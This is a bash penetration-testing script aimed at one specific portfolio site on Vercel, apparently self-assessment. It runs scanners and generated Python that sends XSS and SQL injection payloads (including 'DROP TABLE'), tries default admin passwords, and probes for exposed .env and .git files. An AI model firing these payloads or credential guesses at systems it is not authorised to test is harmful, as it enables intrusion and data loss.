#!/bin/bash

# Portfolio Security Testing Script for Kali Linux
# Target: https://my-digital-portfolio-git-main-sajal-basnets-projects.vercel.app/

TARGET_URL="https://my-digital-portfolio-git-main-sajal-basnets-projects.vercel.app"
OUTPUT_DIR="./security_results_$(date +%Y%m%d_%H%M%S)"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${BLUE}🔐 Portfolio Security Assessment Started${NC}"
echo -e "${BLUE}Target: ${TARGET_URL}${NC}"
echo -e "${BLUE}Timestamp: ${TIMESTAMP}${NC}"

# Create output directory
mkdir -p "$OUTPUT_DIR"

print_header() {
    echo -e "\n${YELLOW}====== $1 ======${NC}"
}

run_test() {
    local test_name="$1"
    local command="$2"
    local output_file="$OUTPUT_DIR/${test_name}.txt"
    
    echo -e "${GREEN}Running: $test_name${NC}"
    echo "Command: $command" > "$output_file"
    echo "Timestamp: $(date)" >> "$output_file"
    echo "----------------------------------------" >> "$output_file"
    
    eval "$command" >> "$output_file" 2>&1
    echo -e "${GREEN}✓ Results saved to: $output_file${NC}"
}

print_header "Phase 1: Basic Reconnaissance"

# Technology identification
run_test "whatweb_scan" "whatweb '$TARGET_URL'"

# Basic HTTP headers
run_test "http_headers" "curl -I '$TARGET_URL'"

# Check robots.txt and common files
run_test "robots_check" "curl -s '$TARGET_URL/robots.txt'"
run_test "sitemap_check" "curl -s '$TARGET_URL/sitemap.xml'"

print_header "Phase 2: Security Headers Analysis"

# Comprehensive security headers check
run_test "security_headers_detailed" "curl -s -I '$TARGET_URL' | grep -E '(Content-Security-Policy|X-Frame-Options|X-XSS-Protection|Strict-Transport-Security|X-Content-Type-Options|Referrer-Policy)'"

# Manual security headers analysis
cat > "$OUTPUT_DIR/check_security_headers.py" << 'EOF'
import requests
import sys

url = "https://my-digital-portfolio-git-main-sajal-basnets-projects.vercel.app"

try:
    response = requests.get(url, timeout=10)
    print("=== Security Headers Analysis ===")
    
    security_headers = {
        'Content-Security-Policy': 'Prevents XSS and data injection attacks',
        'X-Frame-Options': 'Prevents clickjacking attacks', 
        'X-XSS-Protection': 'Enables XSS filtering',
        'Strict-Transport-Security': 'Enforces HTTPS connections',
        'X-Content-Type-Options': 'Prevents MIME type sniffing',
        'Referrer-Policy': 'Controls referrer information'
    }
    
    for header, description in security_headers.items():
        if header in response.headers:
            print(f"✓ {header}: {response.headers[header]}")
        else:
            print(f"✗ {header}: MISSING - {description}")
            
    print(f"\n=== All Response Headers ===")
    for header, value in response.headers.items():
        print(f"{header}: {value}")
        
except Exception as e:
    print(f"Error: {e}")
EOF

run_test "python_security_headers" "python3 '$OUTPUT_DIR/check_security_headers.py'"

print_header "Phase 3: Directory and Endpoint Discovery"

# Directory discovery with dirb
run_test "dirb_scan" "dirb '$TARGET_URL' /usr/share/wordlists/dirb/common.txt -o '$OUTPUT_DIR/dirb_results.txt'"

# Test admin endpoints specifically
admin_endpoints=(
    "/admin"
    "/admin/login"
    "/admin/dashboard"
    "/admin/projects"
    "/admin/hero"
    "/admin/about"
    "/admin/skills"
    "/admin/contact"
    "/admin/messages"
    "/admin/media"
    "/api"
    "/api/contact"
    "/api/auth"
    "/login"
    "/dashboard"
)

echo "Testing admin endpoints..." > "$OUTPUT_DIR/admin_endpoints_test.txt"
for endpoint in "${admin_endpoints[@]}"; do
    echo "Testing: $TARGET_URL$endpoint" >> "$OUTPUT_DIR/admin_endpoints_test.txt"
    curl -s -o /dev/null -w "URL: $TARGET_URL$endpoint | Status: %{http_code} | Size: %{size_download} bytes\n" "$TARGET_URL$endpoint" >> "$OUTPUT_DIR/admin_endpoints_test.txt"
done

print_header "Phase 4: Vulnerability Scanning with Nikto"

# Nikto scan
run_test "nikto_scan" "nikto -h '$TARGET_URL' -Format txt"

print_header "Phase 5: SSL/TLS Security Testing"

# SSL testing
run_test "ssl_test" "testssl.sh '$TARGET_URL'"

print_header "Phase 6: Contact Form Security Testing"

# Create XSS payloads for contact form testing
cat > "$OUTPUT_DIR/test_contact_form.py" << 'EOF'
import requests
import json

url = "https://my-digital-portfolio-git-main-sajal-basnets-projects.vercel.app"

# XSS payloads to test
xss_payloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '"><script>alert("XSS")</script>',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    'javascript:alert("XSS")',
    '<body onload=alert("XSS")>'
]

print("=== Contact Form XSS Testing ===")

for i, payload in enumerate(xss_payloads, 1):
    print(f"\nTest {i}: Testing payload: {payload}")
    
    # Test different possible contact endpoints
    contact_endpoints = ['/api/contact', '/contact', '/api/messages']
    
    for endpoint in contact_endpoints:
        try:
            contact_url = url + endpoint
            data = {
                'name': payload,
                'email': 'test@test.com',
                'message': f'XSS test payload number {i}'
            }
            
            response = requests.post(
                contact_url,
                json=data,
                headers={'Content-Type': 'application/json'},
                timeout=5
            )
            
            print(f"  Endpoint: {endpoint}")
            print(f"  Status: {response.status_code}")
            print(f"  Response length: {len(response.text)}")
            
            # Check if payload is reflected
            if payload in response.text:
                print(f"  ⚠️  POTENTIAL XSS: Payload reflected in response!")
            else:
                print(f"  ✓ Payload not reflected")
                
        except requests.exceptions.RequestException as e:
            print(f"  Endpoint {endpoint}: Connection failed - {e}")
        except Exception as e:
            print(f"  Endpoint {endpoint}: Error - {e}")

print("\n=== SQL Injection Testing ===")

sql_payloads = [
    "admin' OR '1'='1' --",
    "admin'/*",
    "admin' OR 1=1#",
    "'; DROP TABLE projects; --",
    "admin' UNION SELECT password FROM users--"
]

for i, payload in enumerate(sql_payloads, 1):
    print(f"\nSQL Test {i}: {payload}")
    
    try:
        data = {
            'name': payload,
            'email': 'test@test.com', 
            'message': 'SQL injection test'
        }
        
        response = requests.post(
            url + '/api/contact',
            json=data,
            headers={'Content-Type': 'application/json'},
            timeout=5
        )
        
        print(f"  Status: {response.status_code}")
        
        # Check for database error messages
        error_keywords = ['sql', 'syntax', 'database', 'query', 'postgresql', 'supabase']
        response_lower = response.text.lower()
        
        for keyword in error_keywords:
            if keyword in response_lower:
                print(f"  ⚠️  POTENTIAL SQL ERROR: Found '{keyword}' in response")
                break
        else:
            print(f"  ✓ No obvious SQL errors detected")
            
    except Exception as e:
        print(f"  Error: {e}")
EOF

run_test "contact_form_security" "python3 '$OUTPUT_DIR/test_contact_form.py'"

print_header "Phase 7: Admin Authentication Testing"

# Create admin login testing script
cat > "$OUTPUT_DIR/test_admin_login.py" << 'EOF'
import requests
import json

url = "https://my-digital-portfolio-git-main-sajal-basnets-projects.vercel.app"

print("=== Admin Login Security Testing ===")

# Test common admin credentials
admin_creds = [
    ('admin', 'admin'),
    ('admin', 'password'),
    ('admin', '123456'),
    ('administrator', 'admin'),
    ('admin', 'admin123'),
    ('test@test.com', 'password'),
    ('admin@admin.com', 'admin')
]

login_endpoints = ['/admin/login', '/api/auth/login', '/login']

for endpoint in login_endpoints:
    print(f"\nTesting endpoint: {endpoint}")
    
    for email, password in admin_creds:
        try:
            login_url = url + endpoint
            data = {
                'email': email,
                'password': password
            }
            
            response = requests.post(
                login_url,
                json=data,
                headers={'Content-Type': 'application/json'},
                timeout=5
            )
            
            print(f"  {email}:{password} -> Status: {response.status_code}")
            
            # Check for successful login indicators
            success_indicators = ['welcome', 'dashboard', 'admin', 'success', 'token', 'jwt']
            response_lower = response.text.lower()
            
            if any(indicator in response_lower for indicator in success_indicators):
                print(f"    ⚠️  POTENTIAL WEAK CREDENTIALS: Success indicators found!")
            
            # Check for error messages that reveal information
            if 'user not found' in response_lower or 'invalid email' in response_lower:
                print(f"    ℹ️  Email enumeration possible")
                
        except Exception as e:
            print(f"  {email}:{password} -> Error: {e}")

print("\n=== SQL Injection in Login ===")

sql_payloads = [
    "admin' OR '1'='1' --",
    "admin'/*", 
    "admin' OR 1=1#"
]

for payload in sql_payloads:
    for endpoint in login_endpoints:
        try:
            login_url = url + endpoint
            data = {
                'email': payload,
                'password': 'test123'
            }
            
            response = requests.post(
                login_url,
                json=data,
                headers={'Content-Type': 'application/json'},
                timeout=5
            )
            
            print(f"Payload: {payload}")
            print(f"  Endpoint: {endpoint} -> Status: {response.status_code}")
            
            if response.status_code == 200:
                success_indicators = ['welcome', 'dashboard', 'admin', 'success']
                if any(indicator in response.text.lower() for indicator in success_indicators):
                    print(f"    🚨 CRITICAL: Potential SQL injection bypass!")
                    
        except Exception as e:
            print(f"  Error testing {endpoint}: {e}")
EOF

run_test "admin_login_security" "python3 '$OUTPUT_DIR/test_admin_login.py'"

print_header "Phase 8: Information Disclosure Testing"

# Test for exposed files
sensitive_files=(
    "/.env"
    "/.env.local"
    "/.env.production"
    "/package.json"
    "/.git/config"
    "/webpack.config.js"
    "/vite.config.js"
    "/tsconfig.json"
    "/vercel.json"
    "/.vercel"
    "/config.json"
    "/backup"
    "/backup.zip"
    "/database.sql"
)

echo "Testing for sensitive file exposure..." > "$OUTPUT_DIR/sensitive_files_test.txt"
for file in "${sensitive_files[@]}"; do
    echo "Testing: $TARGET_URL$file" >> "$OUTPUT_DIR/sensitive_files_test.txt"
    response=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL$file")
    if [ "$response" = "200" ]; then
        echo "⚠️  FOUND: $TARGET_URL$file (Status: $response)" >> "$OUTPUT_DIR/sensitive_files_test.txt"
        # Download the file for analysis
        curl -s "$TARGET_URL$file" > "$OUTPUT_DIR/exposed_file_$(basename $file).txt"
    else
        echo "✓ Not found: $TARGET_URL$file (Status: $response)" >> "$OUTPUT_DIR/sensitive_files_test.txt"
    fi
done

print_header "Phase 9: JavaScript Analysis"

# Download and analyze JavaScript files for sensitive information
run_test "javascript_analysis" "curl -s '$TARGET_URL' | grep -oE 'src=\"[^\"]*\.js[^\"]*\"' | sed 's/src=\"//g' | sed 's/\"//g' | while read js_file; do
    if [[ \$js_file == /* ]]; then
        js_url=\"$TARGET_URL\$js_file\"
    else
        js_url=\"\$js_file\"
    fi
    echo \"Analyzing: \$js_url\"
    curl -s \"\$js_url\" | grep -i -E '(password|secret|key|token|api|admin|login|supabase)' | head -10
    echo \"---\"
done"

print_header "Phase 10: Advanced Testing with Nuclei"

# Install nuclei if not present and run scan
if command -v nuclei &> /dev/null; then
    run_test "nuclei_scan" "nuclei -u '$TARGET_URL' -t /root/nuclei-templates/ -o '$OUTPUT_DIR/nuclei_results.txt'"
else
    echo "Nuclei not found. Install with: go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest"
fi

print_header "Results Summary"

echo -e "${GREEN}✅ Security assessment completed!${NC}"
echo -e "${BLUE}Results directory: $OUTPUT_DIR${NC}"

# Generate quick summary
echo "=== QUICK SECURITY SUMMARY ===" > "$OUTPUT_DIR/SUMMARY.txt"
echo "Target: $TARGET_URL" >> "$OUTPUT_DIR/SUMMARY.txt"
echo "Assessment Date: $(date)" >> "$OUTPUT_DIR/SUMMARY.txt"
echo "" >> "$OUTPUT_DIR/SUMMARY.txt"

echo "Files generated:" >> "$OUTPUT_DIR/SUMMARY.txt"
ls -la "$OUTPUT_DIR" >> "$OUTPUT_DIR/SUMMARY.txt"

echo "" >> "$OUTPUT_DIR/SUMMARY.txt"
echo "Key files to review:" >> "$OUTPUT_DIR/SUMMARY.txt"
echo "- security_headers_detailed.txt - Check for missing security headers" >> "$OUTPUT_DIR/SUMMARY.txt"
echo "- nikto_scan.txt - Automated vulnerability scan results" >> "$OUTPUT_DIR/SUMMARY.txt"
echo "- contact_form_security.txt - XSS and injection testing results" >> "$OUTPUT_DIR/SUMMARY.txt"
echo "- admin_login_security.txt - Authentication testing results" >> "$OUTPUT_DIR/SUMMARY.txt"
echo "- sensitive_files_test.txt - Information disclosure testing" >> "$OUTPUT_DIR/SUMMARY.txt"

echo -e "${YELLOW}📊 Review the SUMMARY.txt file for an overview of all tests performed${NC}"
echo -e "${YELLOW}🔍 Check individual result files for detailed findings${NC}"
echo -e "${RED}⚠️  Remember: Only test applications you own or have permission to test${NC}"